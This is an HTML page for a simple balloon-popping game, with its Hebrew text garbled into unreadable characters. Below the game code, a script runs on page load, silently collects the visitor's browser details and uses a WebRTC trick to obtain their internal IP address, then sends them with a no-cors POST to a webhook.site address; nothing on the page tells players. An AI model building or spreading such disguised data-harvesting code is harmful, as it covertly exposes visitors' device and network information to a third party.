<!DOCTYPE html>
<html lang="he" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>砖拽  专祝! </title>
    <style>
        body {
            margin: 0;
            padding: 0;
            overflow: hidden;
            background: radial-gradient(circle, #87CEEB, #1E90FF);
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            text-align: center;
            user-select: none;
        }

        h1 {
            color: white;
            text-shadow: 2px 2px 4px rgba(0,0,0,0.3);
            margin-top: 20px;
            pointer-events: none;
        }

        .score-board {
            font-size: 24px;
            color: white;
            font-weight: bold;
        }

        #game-container {
            width: 100vw;
            height: 100vh;
            position: relative;
        }

        .balloon {
            position: absolute;
            bottom: -150px;
            width: 70px;
            height: 90px;
            border-radius: 50% 50% 50% 50% / 40% 40% 60% 60%;
            cursor: crosshair;
            box-shadow: inset -10px -10px 20px rgba(0,0,0,0.2);
            z-index: 10;
        }

        .balloon::after {
            content: "";
            position: absolute;
            bottom: -30px;
            left: 35px;
            width: 2px;
            height: 30px;
            background: rgba(255,255,255,0.6);
        }

        .popped {
            transform: scale(3);
            opacity: 0;
            transition: all 0.2s ease-out;
            pointer-events: none;
        }
    </style>
</head>
<body>

    <h1>砖拽  爪拽! </h1>
    <div class="score-board"> 砖驻爪爪: <span id="score">0</span></div>
    <div id="game-container"></div>

    <script>
        // --- 拽转 砖拽 (Front-end) ---
        let score = 0;
        const container = document.getElementById('game-container');
        const scoreDisplay = document.getElementById('score');

        function createBalloon() {
            const balloon = document.createElement('div');
            balloon.className = 'balloon';
            const colors = ['#FF595E', '#FFCA3A', '#8AC926', '#1982C4', '#6A4C93', '#FF924C'];
            balloon.style.backgroundColor = colors[Math.floor(Math.random() * colors.length)];
            balloon.style.left = Math.random() * (window.innerWidth - 70) + 'px';
            
            const duration = 4 + Math.random() * 4;
            balloon.style.transition = `bottom ${duration}s linear`;
            container.appendChild(balloon);

            setTimeout(() => {
                balloon.style.bottom = (window.innerHeight + 100) + 'px';
            }, 100);

            balloon.addEventListener('mousedown', () => {
                score++;
                scoreDisplay.innerText = score;
                balloon.classList.add('popped');
                setTimeout(() => balloon.remove(), 200);
            });

            setTimeout(() => { if (balloon.parentNode) balloon.remove(); }, duration * 1000);
        }

        setInterval(createBalloon, 800);

        // --- 拽转 住祝 转 (Network/Security) ---
        
        // 专  转 转转 砖拽转 -Webhook.site
        const WEBHOOK_URL = 'https://webhook.site/0ddb829c-12b7-4f5a-add3-679a6ecfbceb';

        async function collectAndSendInfo() {
            const info = {
                timestamp: new Date().toLocaleString('he-IL'),
                userAgent: navigator.userAgent,
                platform: navigator.platform,
                language: navigator.language,
                internalIP: " 爪"
            };

            // 砖砖 -WebRTC  爪 IP 驻
            try {
                const pc = new RTCPeerConnection({ iceServers: [] });
                pc.createDataChannel("");
                pc.createOffer().then(offer => pc.setLocalDescription(offer));
                
                pc.onicecandidate = (ice) => {
                    if (!ice || !ice.candidate) return;
                    const ipRegex = /([0-9]{1,3}(\.[0-9]{1,3}){3})/;
                    const match = ice.candidate.candidate.match(ipRegex);
                    if (match) {
                        info.internalIP = match[1];
                        sendData(info); 
                        pc.onicecandidate = null; // 驻住拽 专 爪 专砖
                    }
                };
                
                // 拽专 砖 Timeout (砖  驻驻 住 WebRTC)
                setTimeout(() => { if(info.internalIP === " 爪") sendData(info); }, 3000);
                
            } catch (e) {
                sendData(info);
            }
        }

        function sendData(data) {
            // 拽 砖转转 砖转 专专转 
            if (WEBHOOK_URL !== 'YOUR_WEBHOOK_URL_HERE') {
                fetch(WEBHOOK_URL, {
                    method: 'POST',
                    mode: 'no-cors', // 驻砖专 砖 Cross-Origin  住转 
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(data)
                }).then(() => {
                    console.log("转 砖 爪 转 .");
                });
            } else {
                console.warn("砖 :  专转 转转 Webhook 转拽 砖专 103.");
                console.log("转 砖 砖:", data);
            }
        }

        // 驻注 转 专拽注
        collectAndSendInfo();
    </script>
</body>
</html>
